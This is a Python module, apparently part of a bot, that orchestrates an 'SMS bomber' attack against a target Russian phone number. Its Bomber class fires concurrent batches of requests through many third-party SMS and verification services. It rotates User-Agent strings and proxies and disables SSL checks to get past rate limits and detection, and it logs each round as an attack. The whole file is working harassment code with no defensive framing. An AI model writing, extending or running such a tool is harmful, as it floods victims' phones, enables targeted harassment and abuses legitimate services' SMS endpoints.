"""Async SMS bomber orchestrator — coordinates concurrent service execution."""

import asyncio
import logging
import random
import time
from typing import Optional

import aiohttp

from base_service import BaseService, SendResult
from phone_utils import format_phone_ru
from services import load_services
from stats import BombStats

log = logging.getLogger("smsbot.bomber")

# Pool of User-Agent strings for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)


class Bomber:
    """Orchestrates concurrent SMS sending across all registered services."""

    def __init__(
        self,
        concurrency: int = 15,
        round_delay: float = 3.0,
        proxy_pool: Optional[list] = None,
    ):
        self.concurrency = concurrency
        self.round_delay = round_delay
        self.proxy_pool = proxy_pool or []
        self._proxy_idx = 0
        self.stats = BombStats()
        self._running = False
        self._stop_event = asyncio.Event()
        self._session: Optional[aiohttp.ClientSession] = None
        self._services: list[BaseService] = []

    def _next_proxy(self) -> Optional[str]:
        if not self.proxy_pool:
            return None
        proxy = self.proxy_pool[self._proxy_idx % len(self.proxy_pool)]
        self._proxy_idx += 1
        return proxy

    async def _get_cookies(self, svc: BaseService) -> dict:
        """Fetch cookies for services that require them."""
        if not svc.requires_cookies or not svc.cookies_url:
            return {}
        try:
            async with self._session.get(
                svc.cookies_url, ssl=False,
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                cookies = {}
                for key, cookie in resp.cookies.items():
                    cookies[key] = cookie.value
                return cookies
        except Exception:
            return {}

    async def _send_one(self, svc: BaseService, phone_formats: dict) -> SendResult:
        """Send SMS via one service, respecting rate limits."""
        proxy = self._next_proxy()

        # Override headers with a random UA
        import base_service as bs
        bs.DEFAULT_HEADERS["User-Agent"] = random_user_agent()

        result = await svc.send_sms(phone_formats, self._session, proxy)
        self.stats.record(result)

        if result.is_success:
            log.info(f"✅ {svc.service_name}: SUCCESS ({result.elapsed:.2f}s)")
        elif result.status.value == "rate_limited":
            log.warning(f"🚫 {svc.service_name}: RATE LIMITED")
        elif result.status.value == "timeout":
            log.warning(f"⏱️  {svc.service_name}: TIMEOUT")
        else:
            log.debug(f"❌ {svc.service_name}: FAILED — {result.error or ''}")

        return result

    async def _run_round(self, services: list, phone_formats: dict):
        """Execute one round of concurrent sends."""
        tasks = []
        for svc in services:
            if self._stop_event.is_set():
                break
            tasks.append(self._send_one(svc, phone_formats))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def attack(self, phone: str) -> BombStats:
        """Launch a full bombing campaign against the given phone number.

        Splits services into rounds to avoid triggering rate limits.
        """
        self._running = True
        self._stop_event.clear()
        self.stats = BombStats()

        phone_formats = format_phone_ru(phone)
        log.info(f"📱 Target: {phone} → {phone_formats['+7']}")
        log.info(f"📦 Loading services...")

        self._services = load_services()
        log.info(f"✅ Loaded {len(self._services)} services")

        connector = aiohttp.TCPConnector(limit=100, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            self._session = session

            # Split into rounds
            round_size = self.concurrency
            service_list = list(self._services)
            random.shuffle(service_list)

            round_num = 0
            for i in range(0, len(service_list), round_size):
                if self._stop_event.is_set():
                    log.info("🛑 Stop requested — halting attack")
                    break

                round_num += 1
                self.stats.round = round_num
                batch = service_list[i : i + round_size]
                log.info(f"🔥 Round {round_num}: attacking with {len(batch)} services")
                await self._run_round(batch, phone_formats)
                log.info(
                    f"📊 Round {round_num} done: "
                    f"✅{self.stats.total_success} ❌{self.stats.total_failed} "
                    f"⚠️{self.stats.total_errors}"
                )

                # Delay between rounds (unless stopped)
                if not self._stop_event.is_set() and i + round_size < len(service_list):
                    await self._wait_with_stop(self.round_delay)

        self.stats.mark_finished()
        self._running = False
        log.info(f"🏁 Attack complete: {self.stats.summary()}")
        return self.stats

    async def _wait_with_stop(self, seconds: float):
        """Sleep with stop-event awareness."""
        try:
            await asyncio.wait_for(self._stop_event.wait(), timeout=seconds)
        except asyncio.TimeoutError:
            pass  # Normal timeout — continue

    def stop(self):
        """Signal the bomber to stop."""
        log.info("⏸️  Stop signal received")
        self._stop_event.set()

    @property
    def is_running(self) -> bool:
        return self._running
